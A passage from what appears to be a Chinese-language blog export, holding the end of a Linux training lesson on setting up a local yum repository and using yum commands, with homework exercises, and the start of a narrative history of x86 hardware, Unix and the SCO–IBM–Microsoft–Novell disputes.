class="line">Complete!</span><br><span class="line">python-deltarpm.x86_64 0:3.5-0.5.20090913git.el64.3.2 制作 rpm 包依赖关系目录</span><br></pre></td></tr></table></figure>

<p>以 rhel7 为例从学校服务器上拷贝一些软件到 /tmp/dvd7.1/ 目录下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 tmp]# cp /mnt/rhel7.1/x86_64/dvd/Packages/* /tmp/dvd7.1</span><br><span class="line">[root@rhel7 tmp]# cd /tmp/dvd7.1</span><br></pre></td></tr></table></figure>

<p>制作 rpm 包依赖关系</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 dvd7.1]# createrepo /tmp/dvd7.1/</span><br><span class="line">Spawning worker 0 with 4371 pkgs</span><br><span class="line">Workers Finished</span><br><span class="line">Saving Primary metadata</span><br><span class="line">Saving file lists metadata</span><br><span class="line">Saving other metadata</span><br><span class="line">Generating sqlite DBs</span><br><span class="line">Sqlite DBs complete</span><br></pre></td></tr></table></figure>

<p>已经成功创建</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 tmp]# ll dvd7.1/ |grep repodata</span><br><span class="line">drwxr-xr-x. 2 root root 4096 Mar 18 07:42 repodata</span><br></pre></td></tr></table></figure>

<h3 id="配置仓库"><a href="#配置仓库" class="headerlink" title="配置仓库"></a>配置仓库</h3><p>为此 , 我们需要优先去配置一个仓库指向文件。这个文件的位置在 /etc/yum.repos.d/ 目录下 , 以 .repo 结尾</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 tmp]# cd /etc/yum.repos.d/</span><br><span class="line">[root@rhel7 yum.repos.d]# ls</span><br><span class="line">server.repo</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[ 仓库名 ]</span><br><span class="line">name = 说明信息</span><br><span class="line">baseurl = 指向 repodata 目录的上一级 .</span><br><span class="line">enable = 是否启用该仓库 0 代表不启用 ,1 代表启用</span><br><span class="line">gpgcheck = 是否需要检测</span><br><span class="line">其中 baseurl</span><br><span class="line">1. 本地路径 file:///content/rhel6.5..... 以下省略 第三个 / 代表的是根 .</span><br><span class="line">2. 远程路径 协议 :// 位置</span><br><span class="line">      例:   http://</span><br><span class="line">       		ftp://</span><br><span class="line">       		nfs://</span><br><span class="line">       		</span><br><span class="line">[server]</span><br><span class="line">name = rhel7.1 repos</span><br><span class="line">baseurl = http://classroom.example.com/content/rhel6.5/x86_64/dvd/</span><br><span class="line">enable=1</span><br><span class="line">gpgcheck=0</span><br><span class="line">[test]</span><br><span class="line">name = info</span><br><span class="line">baseurl=file:///tmp/dvd7.1/</span><br><span class="line">enable=1</span><br><span class="line">gpgcheck=0</span><br></pre></td></tr></table></figure>

<p>配置完仓库后 , 需要使用</p>
<ul>
<li>yum clean all 来清理缓存</li>
<li>yum makecache 来重新生成缓存 .4.5 yum 安装</li>
</ul>
<p>安装</p>
<ul>
<li>yum install 软件名 安装指定软件</li>
<li>yum groupinstall 组名 用来安装一系列的软件包 ,</li>
<li>yum reinstall 软件名 重新安装指定软件</li>
</ul>
<p>-y 选项 , 忽略安装过程出现的 is this ok的交互信息</p>
<ul>
<li>yum localinstall 软件名 本地安装指定软件</li>
</ul>
<p>查询</p>
<ul>
<li>yum list 用来查询所有的软件包</li>
<li>yum list installed 用来查看已经安装过的软件包</li>
<li>yum search 字符串 能够将说明信息里含该字符串的相关软件包罗列出来</li>
<li>yum info 软件包名 用来查看软件包的详细信息</li>
<li>yum grouplist 组名 用来查询系统里所有的组包</li>
<li>yum groupinfo 组名 用来查询指定组的相关信息</li>
</ul>
<p>升级</p>
<ul>
<li>yum update 软件名</li>
<li>yum upgrade 软件名</li>
</ul>
<p>两种写法执行效果没有区别</p>
<p>卸载</p>
<ul>
<li>yum remove 软件名</li>
</ul>
<p>不要使用 yum 去卸载 , 会将软件的依赖关系一并卸载掉 .</p>
<h2 id="Linux-软件安装课后作业"><a href="#Linux-软件安装课后作业" class="headerlink" title="Linux 软件安装课后作业"></a>Linux 软件安装课后作业</h2><ol>
<li>配置一个 yum 仓库。熟悉一下配置的几个字段内容。</li>
<li>安装 vsftpd 软件。</li>
<li>查看 vsftpd 软件的安装文件有哪些</li>
<li>查看一下 touch 命令是由哪个软件包安装出来的</li>
<li>搜索一下含 bind 字符串的软件包。</li>
<li>查询一下 httpd 软件有没有安装 , 没有则将该软件装上。</li>
<li>查看一下 httpd 软件的版本号及试用平台。</li>
<li>卸载 vsftpd 软件。</li>
<li>卸载 httpd 软件 , 不要卸载与其有依赖关系的软件包</li>
</ol>
]]></content>
      <categories>
        <category>技术培训</category>
        <category>Linux系统基础培训</category>
      </categories>
      <tags>
        <tag>培训</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>LINUX HISTORY</title>
    <url>/2016/12/22/booboo_linux_base/00-linux_history/</url>
    <content><![CDATA[<p>如果你喜欢技术，那么Linux的学习会为你打开一个新的世界。</p>
<p>入门难，但是一旦入门，就简单了，加油！</p>
<p>开源万岁～</p>
<h2 id="硬件发展简介"><a href="#硬件发展简介" class="headerlink" title="硬件发展简介"></a>硬件发展简介</h2><h3 id="x86-架构"><a href="#x86-架构" class="headerlink" title="x86 架构"></a>x86 架构</h3><p>1978年6月8日，Intel发布了新款16位微处理器“8086”，也同时开创了一个新时代：x86架构诞生了。X86指令集是美国Intel公司为其第一块16位CPU(i8086)专门开发的，美国IBM公司1981年推出的世<br>界第一台 PC机中的CPU—i8088(i8086简化版)使用的也是X86指令，同时电脑中为提高浮点数据处理能力而增加的X87芯片系列数学协处理器则另外使用X87指令，以后就将X86指令集和X87 指令集统称为<br>X86指令集。虽然随着CPU技术的不断发展，Intel陆续研制出更新型的i80386、i80486直到今天的Pentium 4(以下简为P4)系列，但为了保证电脑能继续运行以往开发的各类应用程序以保护和继承丰富的软件资源， 所以Intel公司所生产的所有CPU仍然继续使用X86指令集，所以它的CPU仍属于X86系列。</p>
<h3 id="Altair-8800"><a href="#Altair-8800" class="headerlink" title="Altair 8800"></a>Altair 8800</h3><p>世界上的第一台个人电脑–“牵牛星”　　</p>
<p>爱德·罗伯兹（Ed Roberts）的梦想是做一名儿科医生。但是命运却让他加入了美国空军，做一名工程师。退伍后，他在新墨西哥州的阿伯克基市机场附近的荒漠上创办了一家称为米兹（MITS）的公司，生产各种电子部件和设备。公司有一段时间的经营还算顺利。当市场上的手持计算器卖到395美元时，米兹公司推出了<br>不到100美元的同类产品。但是不久之后，德州仪器等大公司迅速进入手持计算器的市场，产品价格大幅度下降，低到了米兹公司的成本价以下。米兹公司的其他产品销售情况也很糟。到了1974年，米兹公司已濒临破产边缘。　　</p>
<p>罗伯兹绞尽脑汁思考如何扭转公司的困境。他有了一个想法：能不能创造一种很便宜、能让个人使用的电脑呢？全国已经有很多电脑爱好者，他们都急切希望自己能拥有一台电脑，供个人玩弄，就像很多人在鼓捣自制的无线电收音机一样。市面上现在还没有这样的东西。带着这个想法，他去说服本地银行再给他的公司贷<br>一笔款。米兹公司必须至少再贷将近7万美元才能不致于破产。银行对罗伯兹的想法很怀疑。双方一直谈到深夜。不过，银行面临一个两难的选择：要么不再贷款给米兹公司，让它倒闭，银行以前的投资也就全完了。<br>要么再放一笔贷款，但这笔新贷款很可能又会打水漂。最后，银行再次让罗伯兹确切告诉他们，这种个人电脑什么时候能开发出来，第一年能卖多少套。罗伯兹对什么时候能做出来是有把握的，只要几个月的时间。<br>能卖多少套他就完全没有谱了。于是他说了一个非常乐观的数字：第一年能卖800套，这样销售收入可以有30万美元。拿到贷款后，米兹公司全力开发个人电脑产品。公司必须在最短时间内把产品开发出来并且卖出<br>去，不然破产就难以避免。为了缩短开发时间和降低成本，罗伯兹决定尽量采用现成的部件，做出来产品不是一台现成的计算机，而是一套零部件，需要用户自己装配。所有并非必需的产品特征都被去掉了。产品根<br>本没有今天的微机不可忽缺的键盘、鼠标、显示器、软盘等等设备。产品也没有软件，所有软件(包括所谓的系统软件)都需要用户用设置开关的方式一条指令一条指令地手工输入计算机。<br>　　<br>不管多么简陋，这毕竟是世界上的第一台个人电脑，又称微机。米兹公司的微机产品有两个在当时无可比拟的优点。它很便宜，售价只有不到500美元，而当时一些大公司的实验室也做了类似微机的系统，成本在5<br>万美元左右。另外，米兹的微机设计具有所谓的可扩展能力。用户可以将米兹的微机买回来后，自己再想法配上更多的内存板子和外部设备。有一个用户花了近500美元买了一台微机，再花了3000美元把内存扩展<br>到12KB。《电子科普》（Popular Electronics）杂志听到这个消息后，敏锐地感觉到这是一个历史性的事件，马上决定在1975年1月期作为封面文章报道。但这个个人电脑产品却连名字都还没有。罗伯兹在<br>杂志的责任编辑家里讨论了各种名字。刚好，编辑的家人正在看《星际旅行》的电视节目。那一节刚好讲到了牵牛星座。于是，世界上第一台微机就被命名为“牵牛星”，全称是“牵牛星8800（Altair 8800）”。</p>
<p>罗伯兹做梦也没想到的是，全美有这么多的电脑爱好者，人人都想拥有一台微机。《电子科普》杂志的报道发表后一个月，米兹公司每天都要收到200多台“牵牛星”电脑的订单。生产线根本来不及满足销售需求。有<br>些用户干脆住到公司外面的荒漠上，等着自己的微机生产出来。大多数用户只是购买基本系统。也有用户愿意出495美元，让米兹公司生产一台已经装配好的系统。　　</p>
<p>今天，罗伯兹已经离开了电脑界。他回到乔治亚的老家，获得了医学博士学位，为儿童治病。他为自己创造了计算机领域的一个革命而自豪，但一点也不后悔放弃电脑业，放弃了成为大富翁的机会。他觉得为儿童治病更有意义。爱德·罗伯兹是个很幸福的人，他实现了儿时的梦想。</p>
<h3 id="IBM5150"><a href="#IBM5150" class="headerlink" title="IBM5150"></a>IBM5150</h3><p>IBM推出世界上第一台个人电脑 </p>
<p>1981年8月12日，总部设在美国纽约州阿蒙克的国际商用机器公司（IBM）推出5150的新款电脑，“个人电脑”这个新生市场随之诞生。IBM5150看起来像个米色的“大盒子”，售价1565美元，只有16K字节的内存，可以使用盒式录音磁带来下载和存储数据，此外也可配备5.25英寸的软件盘驱动器。</p>
<h3 id="MOS-Technology-6502"><a href="#MOS-Technology-6502" class="headerlink" title="MOS Technology 6502"></a>MOS Technology 6502</h3><p>当一个满脸横肉的怪人将这个微芯片装在电脑上，并启动电脑时，整个宇宙都震惊了。这个怪人就是苹果公司创始人之一——斯蒂芬·沃兹尼克，那台电脑就是Apple I，处理器用的是由摩斯太克公司研发的8位微处理器6502。</p>
<p>这一处理器同时也是Apple II、the Commodore PET、BBC Micro等经典电脑以及诸如任天堂和Atari等游戏系统的大脑。该处理器的设计者之一Chuck Peddle回忆称，他们是在1975年的一个贸易展示会上推出这款处理器的。他称：“我们用芯片装满了两个玻璃。我和我的妻子就坐在那里卖这些芯片。”摩斯太克公司6502微处理器终于脱颖而出，其原因是，6502的速度并不比它的竞争对手快多少，但是它的价格便宜，每部售价为25美元，而英特尔的8080和摩托罗拉的6800售价大约在200美元。</p>
<h2 id=""><a href="#" class="headerlink" title=""></a><img src="pic/001.jpg" alt="001"></h2><h2 id="操作系统简介"><a href="#操作系统简介" class="headerlink" title="操作系统简介"></a>操作系统简介</h2><h3 id="Unix"><a href="#Unix" class="headerlink" title="Unix"></a>Unix</h3><h4 id="Unix-简史"><a href="#Unix-简史" class="headerlink" title="Unix 简史"></a>Unix 简史</h4><p>1965年时，贝尔实验室(Bell Labs)加入一项由奇异电子(General Electric)和麻省理工学院(MIT)合作的计划；该计划要建立一套多使用者、多任务、多层次(multi-user、multiprocessor、multi-level)的MULTICS操作系统。直到1969年，因MULTICS计划的工作进度太慢，该计划就被停了下来。当时，Ken Thompson（后被称为Unix之父）已经有一个称为「星际旅行」的程序在GE-635的机器上跑，但是反应非常的慢，正巧也被他发现了一部被闲置的PDP-7(Digital的主机)，Ken Thompson和Dernis Ritchie就将「星际旅行」的程序移植到PDP-7上。而这部PDP-7就此在整个计算机历史上留下了芳名。</p>
<p>MULTICS 其实是”MULTiplexed Information and Computing System”的缩写，在1970年时，那部PDP-7却只能支持两个使用者，当时，Brian Kernighan 就开玩笑地戏称他们的系统其实是：”UNiplexed Information and Computing System”，缩写为”UNICS”，后来，大家取其谐音，就称其为”Unix”了。1970年可称为是Unix元年。</p>
<p>1971年，他们申请了一部PDP-11/20，申请的名义是：要发展文书处理系统。该提案被获采纳，他们也发展出了一套文书处理系统 ─ 就是现在Unix操作系统里面文书处理系统(nroff/troff)的前身。有趣的是，没有多久，贝尔实验室的专利部门真的采用了这套系统作为他们处理文件的工具，而贝尔实验室的专利部门也就顺理成章地成为Unix的第一个正式使用者。当时，那部PDP-11／20只有0.5MB磁盘空间。而描述这整个系统的文件被标示为：”First Edition”，版本日期是1970年11月。从此以后，Unix的版本就以系统文件的版别来称呼。</p>
<h4 id="UNIX家谱"><a href="#UNIX家谱" class="headerlink" title="UNIX家谱"></a>UNIX家谱</h4><p>UNIX的历史开始于1969年ken Thompson，Dennis Ritchie（即著名的K&amp;G，C语言的发明人）与一群人在一部PDP-7上进行的一些工作，后来这个系统变成了UNIX。它主要的几个版本为：</p>
<ul>
<li>V1（1971）：第一版的UNIX，以PDP-11/20的汇编语言写成。包括文件系统，fork、roff、ed等软件。</li>
<li>V4（1973）：以C语言从头写过，这使得UNIX修改容易，可以在几个月内移植到新的硬件平台上。最初C语言是为UNIX设计的，所以C与UNIX间有紧密的关系。</li>
<li>V6（1975）：第一个在贝尔实验室外（尤其是大学中）广为流传的UNIX版本。这也是UNIX分支的起点与广受欢迎的开始。1.xBSD （PDP-II）就是由这个版本衍生出来的。</li>
<li>V7（1979）：在许多UNIX玩家的心目中，这是“最后一个真正的UNIX，”这个版本包括一个完整的K&amp;RC编译器，Bourne shell。V7移植到VAX机器后称为32V。</li>
</ul>
<p>目前开发UNIX（System V）的公司是Unix System Laboratories (USL)。USL本为AT&amp;T所有，1993年初被Novell收购。Novell于1993年末将UNIX这个注册商标转让给X/Open组织。</p>
<p>目前为止，UNIX有两大流派：那就是AT&amp;T发布的UNIX操作系统System V与美国加州大学伯克利分校发布的UNIX版BSD（Berkeley Software Distribution）。SVR4是两大流派融合后的产物。1991年底，与System V针锋相对的开放软件基金会(Open Software Foundation)推出了OSF/1。</p>
<p>现在几种主要的UNIX版本:</p>
<ul>
<li>AIX：IBM的UNIX，是根据SVR2（最近已经出到SVR3.2）以及一部分BSD延伸而来，加上各种硬件的支持。具备特有的系统管理（SMIT）。</li>
<li>386BSD：Jolitz从Net/2 software移植过来的。支持Posix，32位。</li>
<li>FreeBSD：1.x从386BSD 0.1而来，FreeBSD 2.x版是用4.4BSD lite改写。</li>
<li>HP-UX（HP）：旧系统是从S III（SVRx）发展面来，现在是由SVR2（4.2BSD）发展而来，目前是10.x版。</li>
<li>Linux(x86)：遵从POSIX，SYSV及BSD的扩展，这一点从上页表中即可看出。</li>
<li>OSF/1（DEC）：DEC对OSF/1的移植。</li>
<li>SCO UNIX（x86）：SVR3.2，目前影响较大的PC UNIX。</li>
<li>SunOS（680x0，Sparc，i386）：根据4.3BSD，包含许多来自System V的东西。Sun的主要成果在于：NFS，OpenLook GUI标准，后来演变为Solaris 。这也是目前最著名的UNIX版本之一。</li>
<li>Ultrix(DEC)：根据4.2BSD再加上许多4.3BSD的东西。</li>
<li>Xenix(x86)：Intel硬件平台上的UNIX，以SVR2为基础，由微软推出。在中国使用较广泛。</li>
</ul>
<h4 id="黑暗史"><a href="#黑暗史" class="headerlink" title="黑暗史"></a>黑暗史</h4><p>Unix与Linux，SCO与IBM、微软，他们是怎样纠结在一起，形成一团解不开的乱麻？</p>
<h5 id="风起Unix"><a href="#风起Unix" class="headerlink" title="风起Unix"></a>风起Unix</h5><p>1969年“阿波罗11号”登月成功。贝尔实验室中一个叫Ken Thompson的年轻人为了一圆翱游太空的梦想，在当时的Multics系统上写了一个叫《星际之旅》的游戏。但当时大型机的机时费很贵，每玩一次公司就要为此支付75美金，于是Thompson打起了小型机PDP-7的主意。但当时的PDP-7只有一个简陋的运行时系统，不支持多用户，为了能双人对战，Thompson找来Dennis Ritchie一起开发新的作系统。他们只花了一个月的时间就用汇编语言写出了作系统的原型。“你写的系统太差劲，干脆就叫Unics算了。”60年代末的一天，贝尔实验室的一位同事对肯·汤普生这样说。同事布莱恩·科尔尼干 Brian W.Kernighan看到后，戏称这个系统为Unics②。Unix这个名字典出于此。</p>
<p>在英文里，Unics发音与Eunuchs一样，而后者的意思是“太监”。汤普生接下同事的嘲弄，稍作修改，把自己研发的系统叫做Unix。</p>
<p>1971年，Unix已经能够支持两名用户在PDP-11上玩《星际之旅》了，但因为当时的Unix是用汇编语言写的，无法移植到其他机器上，所以他们决定用高级语言重写Unix，可当时的高级语言无论从运行效率还是功能上都无法满足他们的需要。Thompson先是在BCPL的基础上萃取出了B语言，Ritchie又在B的基础上进行了重新设计，这才有了今天大名鼎鼎的C语言。</p>
<p>60年代的计算机虽然已不是庞然大物了，但体积仍然不小，而且爱出故障。汤普生回忆：“计算让人着迷，电子也让人着迷，只是不太干净，很脏，因为经常有东西被烧坏。”</p>
<p>操作这些又慢、又笨的大家伙需要专业的计算机程序员，为了提高效率，急需新系统。在这种背景下，汤普生和丹尼斯·利奇研发了Unix操作系统。此时，乔布斯和盖茨还在中学里搞恶作剧，PC和微软操作系统要在10年后才初露端倪。</p>
<p>Unix两位创始人和贝尔实验室也没把这套操作系统太当回事，只是在内部使用，后来大学、研究机构也可以免费使用，而且还提供给他们源代码，因此Unix源代码被广为扩散。在这段时间里，它没有像后来的商业软件那样急功近利，留下一堆窟窿和补丁，因此，Unix在诞生后的10年里“养在深闺人未识”，在实验室进行着充分的使用和论证，这也是它后来在要求稳定性、安全性较高的企业级客户中得到推崇的主要原因。</p>
<p>到了1980年，Unix开始走出实验室，有数以千计的技术高手想把Unix装在家里的机器上。</p>
<p>此时，后知后觉的贝尔实验室开始认识到Unix的价值，但由于源代码早已外散，无法将其拢起来进行精细的商业开发，于是干脆采取对外授权的模式，研究机构使用免费，企业使用要交授权费，这有些金矿当做铜矿卖的味道。一位贝尔高级主管曾感慨：“Unix是继晶体管以后的第二个最重要发明。”但贝尔实验室错失商业发展机遇。</p>
<p>“幸运的时机好比市场上的交易，只要你稍有延误，它就掉价了。”培根在《论时机》中这样写到。当时有多家大学、研究机构和公司获得了Unix授权，并由此开始了各自不同的版本演化之路。1993年，拥有贝尔实验室的美国电话电报公司（AT&amp;T）将自己所拥有的Unix权利卖给Novell，后者成为接受Unix衣钵的合法继承人。当然此时的IBM、DEC、HP和Sun因为早年的授权缘故，有权继续进行各自的Unix版本的研发。</p>
<p>1995年，Novell又将Unix相关资产卖给SCO。和两年前AT&amp;T把Unix卖给Novell一把清的局面有所不同，SCO当时没有足够的现金一次性付清，因此Novell初期只是把Unix源代码交给了SCO，对于Unix著作权的归属协议存在着语焉不详和模棱两可的地方。</p>
<p>花了钱的SCO宣传自己是Unix正宗传人，Novell当时视Unix为鸡肋，没有异议，而且此时SCO没有对别的获得过Unix授权的厂商置喙，于是大家进入了一段相安无事的时期。</p>
<h5 id="微软的进进出出"><a href="#微软的进进出出" class="headerlink" title="微软的进进出出"></a>微软的进进出出</h5><p>八十年代末，有人问比尔·盖茨怎么看待Unix与微软构成的竞争，他笑着问道：“哪个Unix？”微软与Unix的关系源远流长，并对SCO的演变起了重要的催化作用。1979年，微软从美国电话电报公司获得授权，为Intel处理器所开发一种Unix操作系统，由于它购买的授权无法直接让该操作系统以“Unix”为名，于是该系统命名为Xenix，可用在个人电脑及微型计算机上使用。微软并不直接把Xenix销售给终端客户，而是以OEM的形式再授权给Intel、Tandy、施乐Altos及SCO公司。</p>
<p>对于微软来说，由于需要从美国电话电报公司获得授权，因而这是一种自己难以把握其未来发展命运的操作系统，而且当时其他厂商不同的版本在搅浑这个市场，所以，盖茨在寻找机会退出这个领域。当微软和IBM达成开发OS/2操作系统的协议后，盖茨便失去了推广Xenix的兴趣。</p>
<p>多年后的历史资料揭秘显示，微软当时脚踩多条船，除和IBM联手开发OS/2操作系统外，微软还在紧锣密鼓地进行着Windows 3.0系统的研发。微软不可能在三条线上同时投入精力，于是决定舍弃Xenix操作系统。</p>
<p>“赛车和做人一样，有时候要停，有时候要冲。”这是电视剧《极速传说》中的一句台词。1987年，微软与SCO达成了一项协议，以持有后者股票25%的条件转让了Xenix的所有权。从微软接盘的SCO，将这种操作系统以最快速度移植到386电脑，成为首款支持Intel386芯片的操作系统，抓住了市场的先机。</p>
<p>当时的市场格局是这样，小型机加五花八门的Unix操作系统把持了高端的企业级用户市场，其中的代表厂商是IBM、DEC、惠普、SUN、SGI等；Intel芯片加微软操作系统，正在全面控制个人电脑市场，其中的代表厂商包括康柏、AST、佰德等。小型机加Unix操作系统的阵营鄙视Intel芯片加微软操作系统形成的Wintel联盟，前者认为后者简陋，而后者则认为前者是老化顽固。</p>
<p>SCO此时扮演的角色有点像“蝙蝠”，非鸟非兽，它的运营模式是Intel芯片加Unix操作系统，在两大阵营间翩翩飞。随着装有Intel芯片电脑的攻城略地，SCO也跟着分到一杯羹。80年代末，有媒体称Xenix为“可能是传播最广的UNIX操作系统”。</p>
<p>SCO进入了其发展史上最辉煌的时期。当然这段时间，Unix的发展也进入了黄金期。1984年9月《财富》杂志称，全球范围内750所大学中80％的计算机领域的教授是Unix用户，因此当时计算机专业毕业的学生都接触过Unix，他们毕业后成为IT领域的骨干。</p>
<p>盖茨抛弃了Unix，但没打算抛弃这块丰饶的市场，而且SCO的成功也刺激了他：自己扔掉的一块鸡肋竟然成了这个小跟班的肥美牛排。换谁不流口水啊？有句谚语是“别让口馋的人看见你的大碗”。</p>
<p>Unix有个致命缺陷：从来就没有通用版存在。多年以来，由于早期混乱的授权，五花八门、不同版本的Unix遍地开花，所以为其中一个版本写的应用程序，常常要修改后才能运用到另一个上，这对于专业的程序员来说也许不是太大问题，但对技术实力较弱的用户来说，则平添了许多麻烦。</p>
<p>从Unix脱身而出的盖茨深知其支离破碎的弱点，他下令微软打造一款“可移植的”的操作系统——“Unix杀手”。这就是微软的Windows NT，包括SCO在内的Unix阵营将感受到它带来的巨大压力。</p>
<p>歌手鲍勃·迪伦在《时代在转变》一诗中写到：“动笔预言世事的作家与评论家们，张大你们的双眼，机会不会再来第二遍，轮盘还在旋转，先别言之过先，看不出来谁会被选，因为目前的输家未来会领先，因为时代正在改变。”</p>
<h5 id="强悍对手逆袭"><a href="#强悍对手逆袭" class="headerlink" title="强悍对手逆袭"></a>强悍对手逆袭</h5><p>“我不会用狗屎去污染（NT）”。Windows NT研发负责人大卫·卡特勒这样高声地嚷着，他拒绝允诺新一代的操作系统兼容已有的DOS和Windows。原来，定下“Unix杀手”计划后，盖茨准备组织一个团队来完成这项工作。“我太想要一个可移植的操作系统了，”盖茨说，“问题不在于我们是否应该组成团队，而在于何时能组成团队去开发它。”</p>
<p>随后机会来了，DEC的核心工程师卡特勒因在公司坐冷板凳而萌生去意。“大多数人学会如何把一件事做得很漂亮以后，便一生一直做这个，”卡特勒一个同事评价他：“卡特勒会从自己的成功中学习。下一次，他会做得更好。所以每次，他都上升到一个新的高度。”</p>
<p>卡特勒全身心地投入程序开发，而冷落了两任妻子，后来他发誓再也不会结婚，“结婚是一个错误，你只能犯两次错”。卡特勒在程序开发上精益求精，“对可能干扰他的任何人和事，他不仅置之不理，而且还会对其进行攻击和诋毁”，因此，他与DEC公司高管们相处得很不愉快。</p>
<p>盖茨亲自拜会卡特勒，想让他加盟微软。初次见面，卡特勒就给盖茨一个下马威，直言不讳地称微软的代码写得很“烂”，认为盖茨当时捧在手心里的、深以为傲的DOS，在他的眼里就是一个玩具。卡特勒说只有自己才有能力开发出一个能面向未来进行网络管理、具有高可靠性的操作系统。</p>
<p>此时的盖茨已走过创业期，拥有海量的财富与强势的权力，耳边吹过的都是“软件神童”的悦耳之音。不过，卡特勒的刺耳之音和轻蔑态度反而坚定了盖茨聘请他的决心，盖茨向对方表示将给予充分的发展空间和自由。励志大师戴尔·肯耐基说：“在世界上，要影响别人的惟一办法就是谈论他们的需要，并告诉他们去如何满足这些需要。”</p>
<p>卡特勒到微软之后，盖茨尽可能地满足他的要求，有些甚至是打破微软惯例的。譬如卡特勒不要微软原来的工程师参与他的团队，他把自己在DEC工作时的团队带了过来，其中有些是硬件工程师，是卡特勒的好友。盖茨原来不打算要，但卡特勒威胁不让他们来，自己就不来。</p>
<p>盖茨让步，满足了卡特勒所需要的一切。此前，控制欲极强的盖茨会亲自检查微软的大部分代码，在他刨根揭底地穷问下，程序员有时会露出破绽，这时盖茨会不留情面地痛斥，带有攻击性言语，譬如“这是有史以来最愚蠢的代码”会劈头盖脸地砸过去。但盖茨对卡特勒的项目则放手到几乎“放任自流”的地步。Airbnb联合创始人兼CEO布莱恩·切斯基说过：“你有时候必须靠边站，如果你要插手细节，你会很痛苦。但是你要是站得远一点，你就能看清大局。”</p>
<p>盖茨识才的眼光和用人不疑的态度，最终得到了丰厚的回报，1993年，Windows NT完美亮相，成为微软撬动Unix市场的一把利器。卡特勒也获得了Windows NT之父的赞誉，在微软发展史上占有一席之地。罗杰•福尔克在《漫谈企业管理》中提到：“一个人只有处在最能发挥其才能的岗位上，他才会干得最好。”盖茨自己在这一时期说过：“对我来说，跟一伙聪明的工程师一起工作，研发出产品，然后你走出去看到人们确实在使用它们，这才是更大的乐趣所在。”</p>
<p>在包括SCO在内的Unix阵营开足马力贬低Windows NT之时，Windows NT却在高端市场上大步前进，SCO则开始走下坡路。</p>
<p>“节物风光不相待，桑田碧海须臾改。”在微软与Unix阵营的对手进行车轮战的同时，一股新的力量在生成并变得强大起来，左右了战局的发展方向。这就是Linux。</p>
<p>起初盖茨认为Linux无足轻重，但大量的用户不这样认为，他们对Linux投去青睐的目光，因为Linux公开授权，允许用户销售、拷贝并且改动程序，只不过要求修改后的代码也免费公开，这些举措成了Linux蔓延的强大推力，并给微软带来了强烈的冲击。</p>
<p>Linux的存在给了对微软一直心存敌意的对手们一把雪耻的利刃，包括IBM、Oracle、Sun等业界大鳄，纷纷表示扶持Linux，并以各种方式支持Linux，向陷住微软战靴的泥潭灌进去更多的水。微软一度陷入了被动的局面。但随着Linux的发展，战局发生了微妙的变化。</p>
<p>在一个公开场合，盖茨表示：“受到Linux蚕食的是Unix，而不是Windows。”他说：“我们确实在与Linux竞争，但转换到Linux的Unix市场是相当可观的。Windows和Linux将共同主导市场。”</p>
<p>市场分析机构Gartner也宣称，Linux和开放源代码会继续发展，但它们所掠夺的是Unix而不是微软的领地。与Unix有着千丝万缕联系的Linux，竟然扮演了Unix终结者的角色？</p>
<p>这是因为Unix操作系统价格比微软的产品更高，市场份额也更少，受到Linux的冲击也更大，靠着Unix吃饭的SCO对此感同身受。一位Linux厂商技术总监曾放话：“SCO Unix的生命周期已经结束了，系统移植是必然的。”</p>
<p>与其坐以待毙，不如奋力一击。进入21世纪后，日渐式微的SCO开始策划一出震惊IT业界的大戏。</p>
<h5 id="车轮诉讼大战"><a href="#车轮诉讼大战" class="headerlink" title="车轮诉讼大战"></a>车轮诉讼大战</h5><p>“在过去的18个月，我们发现IBM把一些极其高端的企业运算技术的源代码公开了。其中部分看上去与我们拥有知识产权的技术非常相似，违反了我们与IBM之间的协议。他们的行为之间破坏了我们之间不公开这部分技术的协议，单方面公开了源代码。我们有证据表明部分代码是逐字的抄袭。”2003年5月，SCO的CEO达尔·麦克布莱德这样说。</p>
<p>SCO控告IBM的Linux破坏了双方之前签订的软件代码授权协议，声称IBM免费散发有知识产权的代码，把一些Unix的代码改头换面后加入Linux产品中，因此要求蓝色巨人赔偿自己10亿美元。“初寒冻巨海，杀气流大荒。”此举在Linux阵营炸开了锅，他们认为SCO此举为“项庄舞剑，意在沛公”，最终目标是挟制整个Linux阵营。</p>
<p>随后，微软的动作让这个局面变得混乱起来。起诉IBM后不久，SCO宣布向微软发放Unix技术许可，包括专利权和源代码。就是说，微软以花钱买购买SCO的Unix技术许可权的方式，承认了对方Unix合法传人的地位。</p>
<p>布鲁斯·佩伦斯称：“对于微软来说，购买SCO的源代码授权几乎没有任何意义。花钱购买SCO公司的授权，只不过是对一种‘行贿’行为的粉饰，顺便还对未来的Linux用户进行恫吓。可谓一石双鸟！很难想象微软的前对手SCO能为比尔·盖茨冲锋陷阵，但是，微软的钱改变了一切。”</p>
<p>Linux阵营担心的就是这一点，微软此举强化了SCO的Unix“权威地位”，增强了SCO挑战IBM的决心。一旦SCO拿下IBM，就打开了一个收钱口袋，其他推行Linux的厂商只有乖乖纳贡。</p>
<p>而且使用Linux的广大商业用户也面临着被追索的危机，更多的潜在用户将会对Linux望而生畏，这非常符合微软一直针对Linux实施的心理战战术，让用户在恐惧、不确定、怀疑的状态下对Linux敬而远之。考虑到历史上微软与SCO复杂的关系，人们怀疑二者在密谋，认为SCO在扮演为微软火中取栗的角色。2004年初，麦克布莱德警告：全球一些大公司由于使用了Linux将可能很快面临诉讼，其中包括英国石油、西门子和富士通。就是说，SCO的诉讼风暴即将席卷全球。</p>
<p>借着SCO对Linux阵营的压力，2004年11月，微软CEO鲍尔默在新加坡举行的一个高级别政府论坛上表示，Linux侵犯了至少228项专利，不过他并没有明确表示侵犯了哪些专利。他说：“对于那些已经加入世界贸易组织的国家而言，使用Linux就意味着有一天会有人过来向你收取专利费。”</p>
<p>2005年1月，美国法院判决IBM交出20亿行的程序代码给SCO，消息传出后，SCO股价暴涨20%。</p>
<p>SCO似乎可以动手敛钱了，然而风云又变，半路杀出一个程咬金。Novell公司站了出来，称自己才是Unix版权的合法拥有者，说自己当年没有把Unix版权卖给SCO，SCO也只是个授权使用者，并且要对方把从微软和Sun收到的授权许可费给吐出来。</p>
